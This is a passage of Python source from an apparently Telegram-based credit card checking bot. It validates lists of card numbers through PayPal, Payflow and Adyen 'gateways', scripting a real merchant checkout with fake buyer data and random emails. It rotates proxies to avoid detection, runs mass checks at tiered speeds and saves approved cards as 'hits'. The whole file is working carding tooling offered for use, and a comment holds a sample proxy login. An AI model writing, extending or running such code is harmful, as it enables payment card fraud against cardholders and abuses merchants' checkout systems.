                if response_json is None or not isinstance(response_json, dict):
                    return default_result
                
                return await parse_paypal_response(response_json, elapsed, proxy)
                
            except json.JSONDecodeError as e:
                print(f"⚠️ [PAYPAL DEBUG] JSON parse error: {e}")
                return {
                    "status": "error",
                    "result": "JSON_ERROR",
                    "message": "Invalid JSON response",
                    "status_display": "⚠️ JSON ERROR",
                    "status_category": "error",
                    "elapsed": elapsed,
                    "proxy_used": proxy,
                    "retryable": True
                }
        else:
            print(f"⚠️ [PAYPAL DEBUG] HTTP error: {response.status_code}")
            retryable = response.status_code in [500, 502, 503, 504, 408, 429]
            return {
                "status": "error",
                "result": f"HTTP_{response.status_code}",
                "message": f"HTTP Error: {response.status_code}",
                "status_display": f"⚠️ HTTP {response.status_code}",
                "status_category": "error",
                "elapsed": elapsed,
                "proxy_used": proxy,
                "retryable": retryable
            }
            
    except httpx.TimeoutException as e:
        elapsed = time.time() - start_time if 'start_time' in locals() else 0
        print(f"⏰ [PAYPAL DEBUG] Timeout after {elapsed:.1f}s")
        
        # ============ ADDED: Retry on timeout (only once) ============
        if retry_count == 0:
            print(f"🔄 [PAYPAL DEBUG] Timeout occurred - retrying once...")
            await asyncio.sleep(2)  # Wait 2 seconds before retry
            return await make_paypal_request(card, amount, currency, proxy, retry_count=1, user_id=user_id)
        
        return {
            "status": "error",
            "result": "TIMEOUT",
            "message": "Request timeout after retry",
            "status_display": "⚠️ TIMEOUT",
            "status_category": "error",
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": False
        }
    except Exception as e:
        elapsed = time.time() - start_time if 'start_time' in locals() else 0
        print(f"❌ [PAYPAL DEBUG] Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "elapsed": elapsed,
            "proxy_used": proxy,
            "retryable": True
        }
        



# Updated check_card_paypal function with retry logic
async def check_card_paypal(card: str, amount: str = "1.00", currency: str = "USD", proxy: str = None, user_id: int = None) -> Dict:
    """
    Check card using PayPal gateway - FAST FAIL
    """
    print(f"\n{'='*80}")
    print(f"💳 [PAYPAL GATEWAY] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    else:
        print(f"🔌 No proxy - direct connection")
    print(f"{'='*80}")
    
    # ============ FIXED: Only 1 attempt (no retry) for speed ============
    try:
        # Get proxy if allowed
        fresh_proxy = None
        if user_id and user_manager.can_use_proxy(user_id):
            fresh_proxy = get_rotating_proxy_for_user(user_id, 'paypal')
            print(f"🔌 [PAYPAL] Using proxy: {mask_proxy(fresh_proxy) if fresh_proxy else 'None'}")
        
        # Make the request (no retry loop)
        result = await make_paypal_request(card, amount, currency, fresh_proxy, retry_count=0, user_id=user_id)
        
        # Get status
        status = result.get("status", "error")
        
        # Mark proxy as working if we got a response (even if declined)
        if fresh_proxy and status in ["success", "declined"]:
            proxy_manager.mark_proxy_success_for_user(user_id, fresh_proxy)
            print(f"✅ [PAYPAL] Proxy working: {mask_proxy(fresh_proxy)}")
        elif fresh_proxy and status == "error":
            proxy_manager.mark_proxy_failure_for_user(user_id, fresh_proxy)
            print(f"❌ [PAYPAL] Marked proxy as failed: {mask_proxy(fresh_proxy)}")
        
        return result
        
    except Exception as e:
        print(f"❌ [PAYPAL GATEWAY] Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "retryable": False
        }

def format_paypal_response(result: Dict, card: str, bin_info: tuple, amount: str) -> Tuple[str, str]:
    """Format PayPal response for display - shows raw API message"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    result_text = result.get("result", "UNKNOWN")
    message = result.get("message", "Unknown")
    code = result.get("code", "")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    attempt = result.get("attempt", 1)
    
    # Use the best available response text
    if message and message != "Unknown":
        response_msg = message
    elif result_text and result_text != "UNKNOWN":
        response_msg = result_text
    else:
        response_msg = "Unknown"
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    # Add code if available and not already in message
    if code and code not in response_msg:
        response_msg = f"{response_msg} [{code}]"
    
    # Add retry info if multiple attempts
    retry_info = f"\n[⌬] 𝐑𝐞𝐭𝐫𝐢𝐞𝐬 ↣ {attempt}" if attempt > 1 else ""
    
    # Add developer credit
    developer_credit = "👨‍💻 API by @Cypher099"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ PayPal\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ ${amount}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s{retry_info}\n"
        f"[⌬] {developer_credit}"
    )
    return ui, status_category

# ============ PAYFLOW GATEWAY FUNCTIONS ============

def format_proxy_for_payflow(proxy: str) -> Optional[str]:
    """
    Format proxy specifically for Payflow gateway (SpeechBuddy)
    Handles all proxy formats and converts to requests-compatible format
    
    Supported input formats:
    - user:pass@host:port
    - host:port:user:pass  
    - user:pass:host:port
    - host:port
    - http://user:pass@host:port
    - http://host:port@user:pass (malformed - fixes it)
    """
    if not proxy:
        return None
    
    try:
        original = proxy
        print(f"🔧 [Payflow Proxy] Processing: {mask_proxy(original)}")
        
        # Remove any protocol prefix for parsing
        clean = proxy
        protocol = "http"
        if clean.startswith(('http://', 'https://')):
            protocol = clean.split('://')[0]
            clean = clean.split('://', 1)[1]
        
        # ============ FIX: Handle malformed format: host:port@user:pass ============
        # Example: px173007.pointtoserver.com:10780@purevpn0s12153504:1LTpwxbCJbEdXo
        if '@' in clean:
            parts = clean.split('@')
            if len(parts) == 2:
                left = parts[0]   # Could be host:port OR user:pass
                right = parts[1]  # Could be user:pass OR host:port
                
                # Check if left contains a colon and ends with a port number
                left_parts = left.split(':')
                if len(left_parts) >= 2 and left_parts[-1].isdigit():
                    # This is host:port@user:pass (MALFORMED)
                    host = left_parts[0]
                    port = left_parts[-1]
                    
                    # Right part should be user:pass
                    if ':' in right:
                        user, password = right.split(':', 1)
                        formatted = f"{user}:{password}@{host}:{port}"
                        print(f"✅ [Payflow Proxy] Fixed malformed: {mask_proxy(formatted)}")
                        return formatted
                    else:
                        # Right part is just username without password
                        user = right
                        password = ""
                        formatted = f"{user}:{password}@{host}:{port}"
                        print(f"✅ [Payflow Proxy] Fixed malformed (no password): {mask_proxy(formatted)}")
                        return formatted
        
        # ============ Format 1: user:pass@host:port (CORRECT) ============
        if '@' in clean:
            auth, hostport = clean.split('@', 1)
            if ':' in auth and ':' in hostport:
                # Already correct format
                print(f"✅ [Payflow Proxy] Using correct format: {mask_proxy(clean)}")
                return clean
        
        # ============ Format 2: host:port:user:pass ============
        parts = clean.split(':')
        if len(parts) == 4:
            # Check if second part is numeric (port) -> host:port:user:pass
            if parts[1].isdigit():
                host, port, user, password = parts
                formatted = f"{user}:{password}@{host}:{port}"
                print(f"✅ [Payflow Proxy] Formatted host:port:user:pass -> {mask_proxy(formatted)}")
                return formatted
            # Otherwise it might be user:pass:host:port
            elif parts[3].isdigit():
                user, password, host, port = parts
                formatted = f"{user}:{password}@{host}:{port}"
                print(f"✅ [Payflow Proxy] Formatted user:pass:host:port -> {mask_proxy(formatted)}")
                return formatted
        
        # ============ Format 3: host:port only ============
        if len(parts) == 2 and parts[1].isdigit():
            print(f"✅ [Payflow Proxy] Using host:port only: {mask_proxy(clean)}")
            return clean
        
        # ============ Format 4: Try to detect port anywhere ============
        # Look for any numeric part that could be a port
        port_index = -1
        for i, part in enumerate(parts):
            if part.isdigit() and 1 <= int(part) <= 65535:
                port_index = i
                break
        
        if port_index != -1:
            # Found a port number
            if port_index == 1 and len(parts) >= 4:
                # host:port:user:pass
                host = parts[0]
                port = parts[1]
                user = parts[2] if len(parts) > 2 else ''
                password = parts[3] if len(parts) > 3 else ''
                if user and password:
                    formatted = f"{user}:{password}@{host}:{port}"
                    return formatted
            elif port_index == 3 and len(parts) >= 4:
                # user:pass:host:port
                user = parts[0]
                password = parts[1]
                host = parts[2]
                port = parts[3]
                formatted = f"{user}:{password}@{host}:{port}"
                return formatted
            elif port_index == 1 and len(parts) == 2:
                # host:port only
                return clean
        
        # ============ Format 5: Last resort - try generic formatting ============
        # Try to use the global format_proxy as fallback
        from your_module import format_proxy as global_format
        formatted = global_format(proxy)
        if formatted:
            # Remove http:// prefix if present
            clean_formatted = formatted.replace('http://', '').replace('https://', '')
            if '@' in clean_formatted:
                print(f"✅ [Payflow Proxy] Using global formatter: {mask_proxy(clean_formatted)}")
                return clean_formatted
            elif ':' in clean_formatted:
                print(f"✅ [Payflow Proxy] Using global formatter (host:port): {mask_proxy(clean_formatted)}")
                return clean_formatted
        
        print(f"⚠️ [Payflow Proxy] Could not parse: {original[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [Payflow Proxy] Error: {e}")
        return None
    
def generar_correo_aleatorio():
    """Generate random email for Payflow"""
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) + "@gmail.com"
    return email

# Helper function to run blocking requests in thread pool
async def run_sync_in_thread(func, *args, **kwargs):
    """Run a synchronous function in a thread pool to avoid blocking the event loop"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(thread_pool, lambda: func(*args, **kwargs))

def payflow_sync_check(card: str, proxy_str: str = None) -> dict:
    """
    Synchronous Payflow card check with proxy support - RUNS IN THREAD POOL
    Full debug output to console
    """
    print("\n" + "="*80)
    print(f"💸 [PAYFLOW DEBUG] Starting sync check for card: {card[:20]}...")
    if proxy_str:
        print(f"🔌 [Payflow Debug] Using proxy: {mask_proxy(proxy_str)}")
    else:
        print(f"🔌 [Payflow Debug] No proxy, using direct connection")
    print("="*80)
    
    session = requests.Session()
    
    # ============ FIXED: Use Payflow-specific proxy formatter ============
    if proxy_str:
        proxy_url = format_proxy_for_payflow(proxy_str)
        if proxy_url:
            # Add http:// if not present
            if not proxy_url.startswith(('http://', 'https://')):
                proxy_url = f"http://{proxy_url}"
            
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url,
            }
            print(f"🔌 [Payflow Debug] Proxy configured: {mask_proxy(proxy_str)}")
        else:
            print(f"⚠️ [Payflow Debug] Could not format proxy, continuing without proxy")
            proxy_url = None
    
    # Rest of your function remains the same...
    retry_strategy = requests.adapters.Retry(
        total=2,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'Connection': 'keep-alive',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
    }

    try:
        print(f"🔍 [Payflow Debug] Splitting card: {card}")
        b, c, d, e = card.split("|")
        print(f"📊 [Payflow Debug] Card parts - Number: {b[:6]}******, Month: {c}, Year: {d}, CVV: {e}")
        
        if len(d) == 2:
            d = "20" + d
            print(f"📅 [Payflow Debug] Fixed 2-digit year to 4-digit: {d}")

        print("\n🛒 [Payflow Debug] Step 1: Adding product to cart...")
        params = {
            'discount_code': 'undefined',
            'total': '',
            'the_id': '26',
            'method': 'add',
            'the_quantity': '1',
        }
        
        cart_response = session.get(
            'https://www.speechbuddy.com/controllers/cart.php', 
            params=params, 
            headers=headers,
            timeout=20
        )
        print(f"📡 [Payflow Debug] Cart response status: {cart_response.status_code}")

        print("\n📝 [Payflow Debug] Step 2: Preparing checkout data...")
        email = generar_correo_aleatorio()
        data = {
            'order_notes': '',
            'items_total': '10.99',
            'shipping': '4.00',
            'amt': '14.99',
            'international': 'false',
            'subtotal': '10.99',
            'tax_amt': '0',
            'free_shipping': 'false',
            'discount_total': '0',
            'discount_type': '',
            'discount_amount': '',
            'pay_with_paypal': 'false',
            'discount_code': '',
            'ship_country': 'US',
            'first_name': 'juan',
            'last_name': 'torres',
            'ship_address_1': 'nnn',
            'ship_address_2': 'nn',
            'ship_city': 'nnnn',
            'ship_state': 'SC',
            'ship_zip': '29907',
            'email': email,
            'phone': '8435220873',
            'question_one': 'SLP, in schools',
            'question_two': 'Colleague',
            'question_three': '',
            'payment_method': 'credit',
            'payment_name': 'juan carlos xd',
            'acct': b,
            'expmonth': c,
            'expyear': d,
            'cvv2': e,
            'same_as_shipping': 'on',
            'bill_country': 'US',
            'bill_first_name': 'juan',
            'bill_last_name': 'torres',
            'bill_address_1': 'nnn',
            'bill_address_2': 'nn',
            'bill_city': 'nnnn',
            'bill_state': 'SC',
            'bill_zip': '29907',
        }
        print(f"📦 [Payflow Debug] Checkout data prepared with email: {email}")

        print("\n🚀 [Payflow Debug] Step 3: Sending checkout POST request...")
        response = session.post(
            'https://www.speechbuddy.com/checkout/process-checkout',
            headers=headers, 
            data=data, 
            timeout=30
        )
        print(f"📡 [Payflow Debug] Checkout response status: {response.status_code}")
        print(f"📄 [Payflow Debug] Checkout response preview: {response.text[:500]}")

        print("\n🔍 [Payflow Debug] Step 4: Parsing response with BeautifulSoup...")
        soup = BeautifulSoup(response.content, 'html.parser')
        f = soup.select_one('#site_flash > div > h3')
        
        if f:
            f_text = f.text.strip()
            print(f"✅ [Payflow Debug] Found response element: '{f_text}'")
        else:
            f_text = "No response element found"
            print(f"⚠️ [Payflow Debug] Could not find #site_flash > div > h3 element")

        if 'approved' in f_text.lower() or 'success' in f_text.lower():
            status = "APPROVED ✅"
            print(f"✅ [Payflow Debug] Card APPROVED! Status: {status}")
        elif 'not accepted' in f_text.lower() or 'declined' in f_text.lower():
            status = "DECLINED ❌"
            print(f"❌ [Payflow Debug] Card DECLINED! Status: {status}")
        else:
            status = "UNKNOWN ⚠️"
            print(f"⚠️ [Payflow Debug] Unknown status: {status}")

        result = {"status": status, "text": f_text}
        print(f"📊 [Payflow Debug] Final result: {result}")
        return result

    except Exception as ex:
        print(f"❌ [Payflow Debug] Exception occurred: {ex}")
        print(f"📝 [Payflow Debug] Traceback: {traceback.format_exc()}")
        return {"status": "ERROR", "text": str(ex)}
async def payflow_check(card: str, proxy_str: str = None) -> dict:
    """
    Async wrapper for Payflow card check with proxy support
    Runs sync function in thread pool to avoid blocking
    """
    print(f"\n🔄 [Payflow Debug] payflow_check async wrapper called for card: {card[:20]}...")
    if proxy_str:
        print(f"🔌 [Payflow Debug] Using proxy: {mask_proxy(proxy_str)}")
    print("⚙️ [Payflow Debug] Running sync function in thread pool...")
    result = await run_sync_in_thread(payflow_sync_check, card, proxy_str)
    print(f"✅ [Payflow Debug] Async wrapper complete, result: {result}")
    return result

async def check_card_payflow(card: str, proxy: str = None) -> Dict:
    """Check card using Payflow gateway with proxy support"""
    print(f"\n" + "="*80)
    print(f"💳 [PAYFLOW GATEWAY] Starting check for card: {card[:20]}...")
    if proxy:
        print(f"🔌 [Payflow Debug] Proxy provided: {mask_proxy(proxy)}")
    print("="*80)
    
    try:
        print("🔄 [Payflow Debug] Calling payflow_check...")
        result = await payflow_check(card, proxy)
        
        status = result.get("status", "ERROR")
        text = result.get("text", "Unknown")
        
        print(f"📊 [Payflow Debug] Raw result from payflow_check: {result}")
        
        if "APPROVED" in status:
            print(f"✅ [Payflow Debug] Card APPROVED! Message: {text}")
            return {
                "status": "success",
                "result": "APPROVED",
                "message": text,
                "status_display": "✅ APPROVED",
                "status_category": "approved"
            }
        elif "DECLINED" in status:
            print(f"❌ [Payflow Debug] Card DECLINED! Message: {text}")
            return {
                "status": "declined",
                "result": "DECLINED",
                "message": text,
                "status_display": "❌ DECLINED",
                "status_category": "declined"
            }
        else:
            print(f"⚠️ [Payflow Debug] Unknown status! Status: {status}, Message: {text}")
            return {
                "status": "unknown",
                "result": "UNKNOWN",
                "message": text,
                "status_display": "⚠️ UNKNOWN",
                "status_category": "unknown"
            }
            
    except Exception as e:
        print(f"❌ [Payflow Debug] Exception in check_card_payflow: {e}")
        print(f"📝 [Payflow Debug] Traceback: {traceback.format_exc()}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error"
        }

def format_payflow_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Payflow response for display"""
    print(f"🎨 [Payflow Debug] Formatting response for card: {card[:20]}...")
    
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_text = result.get("message", "Unknown")
    result_text = result.get("result", "Unknown")
    
    response_msg = f"{result_text}: {response_text}" if response_text != "Unknown" else result_text
    
    print(f"📝 [Payflow Debug] Formatted - Status: {status_display}, Category: {status_category}, Response: {response_msg}")
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Payflow\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    return ui, status_category

async def payflow_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    """Mass check logic for Payflow gateway with proxy support - FIXED for multi-user"""
    u_id = update.effective_user.id
    message = update.effective_message
    

    
    # REMOVED global semaphore acquisition - no blocking
    # if not await user_semaphore.acquire():
    #     await message.reply_text("⚠️ Bot is busy with many users. Please try again in a moment.")
    #     return
    
    try:
        # Mark user as active
        payflow_active_tasks[u_id] = True
        
        approved, declined, errors = 0, 0, 0
        total = len(cards)
        start_time_session = time.time()
        results_sent = 0
        
        print(f"\n" + "="*80)
        print(f"🚀 [PAYFLOW MASS CHECK] Starting batch for user {u_id}")
        print(f"📊 Total cards: {total}")
        print("="*80)
        
        tier = "free"  # Default
        if u_id == OWNER_ID:
            tier = "admin"
            
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        print(f"👤 [Payflow Debug] User tier: {tier}, Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour")
        
        await message.reply_text(
            f"🔄 <b>Payflow Batch Started</b>\n\n"
            f"📝 Cards: {total}\n"
            f"📍 Using Payflow Gateway (with proxy support)\n"
            f"⚡ Speed: {TIER_SPEEDS.get(tier, 900)} cards/hour ({TIER_CONCURRENCY.get(tier, 1)} parallel)\n"
            f"📊 Only approved cards will be shown\n"
            f"👥 Other users can still use the bot",
            parse_mode=ParseMode.HTML,
            reply_markup=stop_markup(u_id)
        )
        
        # Create semaphore for concurrency control within user session
        semaphore = asyncio.Semaphore(TIER_CONCURRENCY.get(tier, 1))
        
        async def check_with_control(card):
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                
                proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_card_payflow(card, proxy_str)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                return result, card, elapsed
        
        # Process cards in chunks to avoid overwhelming
        chunk_size = min(10, TIER_CONCURRENCY.get(tier, 1))
        for i in range(0, len(cards), chunk_size):
            # Check if session was stopped
            if u_id not in payflow_active_tasks:
                try:
                    await message.reply_text("🛑 <b>Session stopped</b>", parse_mode=ParseMode.HTML)
                    print(f"🛑 [Payflow Debug] Session stopped by user")
                except:
                    pass
                break
                
            chunk = cards[i:i+chunk_size]
            tasks = [check_with_control(card) for card in chunk]
            
            # Add timeout for each chunk
            try:
                chunk_results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=180  # 2 minute timeout per chunk
                )
            except asyncio.TimeoutError:
                await message.reply_text("⚠️ Chunk processing timeout, continuing...")
                continue
            
            # Process chunk results
            for idx, item in enumerate(chunk_results, i+1):
                if u_id not in payflow_active_tasks:
                    break
                
                if isinstance(item, Exception):
                    print(f"❌ [Payflow Debug] Task exception: {item}")
                    errors += 1
                    continue
                
                result, card, elapsed = item
                    
                try:
                    print(f"🔍 [Payflow Debug] Getting BIN info for card {card[:20]}...")
                    bin_info = await get_bin_info(card)
                    print(f"✅ [Payflow Debug] BIN info retrieved: {bin_info[0]}")
                    
                    ui, status_category = format_payflow_response(result, card, bin_info)
                except Exception as e:
                    print(f"❌ [Payflow Debug] Error formatting response: {e}")
                    errors += 1
                    continue
                
                # Hit notification and file storage for approved cards
                if status_category in ["approved"]:
                    try:
                        print(f"✅ [Payflow Debug] APPROVED card found: {card[:20]}")
                        await save_hit_to_file(
                            card=card,
                            gateway="Payflow",
                            response=result.get("message", "Approved"),
                            price="$14.99",
                            bin_info=bin_info,
                            user_id=u_id,
                            user_tier=tier
                        )
                    except Exception as e:
                        print(f"❌ [Payflow Debug] Error in hit notification: {e}")
                
                if status_category == "approved":
                    approved += 1
                    try:
                        stats = speed_controller.get_stats()
                        progress = int((idx/total)*10)
                        bar = "▓" * progress + "░" * (10 - progress)
                        
                        # Send result with timeout
                        try:
                            await asyncio.wait_for(
                                message.reply_text(ui, parse_mode=ParseMode.HTML),
                                timeout=10
                            )
                            results_sent += 1
                            print(f"📤 [Payflow Debug] Sent result for approved card #{idx}")
                        except asyncio.TimeoutError:
                            print(f"⚠️ [Payflow Debug] Timeout sending result for card {idx}")
                            
                    except Exception as e:
                        print(f"❌ [Payflow Debug] Error sending approved message: {e}")
                        
                elif status_category == "declined":
                    declined += 1
                    print(f"❌ [Payflow Debug] Card declined (silent): {card[:20]}")
                    # Silent skip - no user notification
                    pass
                else:
                    errors += 1
                    print(f"⚠️ [Payflow Debug] Card error (silent): {card[:20]} - {result.get('message', 'Unknown')}")
                    # Silent skip - no user notification
                    pass
                
                # Small yield to event loop
                await asyncio.sleep(0.001)
        
        # Send summary
        if u_id in payflow_active_tasks:
            total_time = time.time() - start_time_session
            stats = speed_controller.get_stats()
            summary = (
                f"🏁 <b>Payflow Session Finished</b>\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⚡ Speed: {stats['current_cph']:.0f}/{stats['target_cph']} cph\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s"
            )
            try:
                await message.reply_text(summary, parse_mode=ParseMode.HTML)
                print(f"📊 [Payflow Debug] Session summary sent: {summary}")
            except Exception as e:
                print(f"❌ [Payflow Debug] Error sending summary: {e}")
            
    except Exception as e:
        print(f"❌ [Payflow Debug] Error in payflow_mass_check_logic: {e}")
        print(f"📝 [Payflow Debug] Traceback: {traceback.format_exc()}")
        try:
            await message.reply_text(f"❌ Error in session: {str(e)[:100]}")
        except:
            pass
    finally:
        print(f"🏁 [Payflow Debug] Session ended, removing from active tasks")
        payflow_active_tasks.pop(u_id, None)
        if u_id in user_speed_controllers:
            # Keep controller for stats, but could clean after idle time
            pass
        # REMOVED global semaphore release
        # user_semaphore.release()

async def payflow_single_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """Single check logic for Payflow gateway"""
    u_id = update.effective_user.id
    message = update.effective_message
    
    try:
        allowed, error_msg = await check_user_access(update, context, "payflow")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        status_msg = await message.reply_text("🔄 Checking card with Payflow gateway...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_payflow(card, proxy_str)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        ui, status_category = format_payflow_response(result, card, bin_info)
        
        if status_category == "approved":
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context,
                gateway="Payflow",
                card=card,
                response=result.get("message", "Approved"),
                price="$14.99",
                user=user_data,
                bin_info=bin_info,
                status_category=status_category
            )
            
            await save_hit_to_file(
                card=card,
                gateway="Payflow",
                response=result.get("message", "Approved"),
                price="$14.99",
                bin_info=bin_info,
                user_id=u_id,
                user_tier=tier
            )
            
            user_manager.increment_checks(u_id)
        
        ui += f"\n[⌬] 𝐒𝐩𝐞𝐞𝐝 ↣ {elapsed:.2f}s"
        
        await status_msg.edit_text(ui, parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ [Payflow Single] Error: {traceback.format_exc()}")
        
        
# ============ ADYEN DIRECT GATEWAY ============
ADYEN_DIRECT_API_URL = "https://web-production-2c66c.up.railway.app"  # Replace with your actual Railway URL

async def check_card_adyen_direct(card: str, proxy: str = None, user_id: int = None) -> Dict:
    """
    Check card using Adyen Direct API
    """
    print(f"\n{'='*80}")
    print(f"💳 [ADYEN DIRECT] Checking card: {card[:20]}...")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    else:
        print(f"🔌 No proxy")
    print(f"{'='*80}")
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        cc, mm, yy, cvv = parts
        
        # Format year
        if len(yy) == 2:
            yy = f"20{yy}"
        
        start_time = time.time()
        
        # Make request
        async with httpx.AsyncClient(timeout=45.0) as client:
            response = await client.post(
                f"{ADYEN_DIRECT_API_URL}/check",
                json={
                    "cc": cc,
                    "mes": mm,
                    "ano": yy,
                    "cvv": cvv
                }
            )
        
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            data = response.json()
            
            # Map to our format
            status = data.get('status', 'ERROR')
            text = data.get('text', 'Unknown')
            bin_code = data.get('bin', cc[:6])
            last4 = data.get('last4', cc[-4:])
            
            if status == 'APPROVED':
                status_display = "✅ APPROVED"
                status_category = "approved"
            elif status == 'DECLINED':
                status_display = "❌ DECLINED"
                status_category = "declined"
            else:
                status_display = "⚠️ ERROR"
                status_category = "error"
            
            return {
                "status": "success" if status in ['APPROVED', 'DECLINED'] else "error",
                "result": status,
                "message": text,
                "status_display": status_display,
                "status_category": status_category,
                "elapsed": elapsed,
                "bin": bin_code,
                "last4": last4,
                "card_display": f"{bin_code}******{last4}",
                "proxy_used": proxy,
                "bank": data.get('bank', 'Unknown'),
                "country": data.get('country', 'Unknown')
            }
        else:
            return {
                "status": "error",
                "result": f"HTTP_{response.status_code}",
                "message": f"HTTP Error: {response.status_code}",
                "status_display": f"⚠️ HTTP {response.status_code}",
                "status_category": "error",
                "elapsed": elapsed
            }
            
    except Exception as e:
        print(f"❌ [Adyen Direct] Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error"
        }


def format_adyen_direct_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Adyen Direct response for display"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    message = result.get("message", "Unknown")
    elapsed = result.get("elapsed", 0)
    proxy_used = result.get("proxy_used", "None")
    bin_code = result.get("bin", "N/A")
    last4 = result.get("last4", "N/A")
    api_bank = result.get("bank", bank)
    api_country = result.get("country", country)
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    # Use API bank info if available
    if api_bank != 'Unknown':
        bank_display = api_bank
    else:
        bank_display = bank
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_display}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Adyen Direct\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {message}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_code}\n"
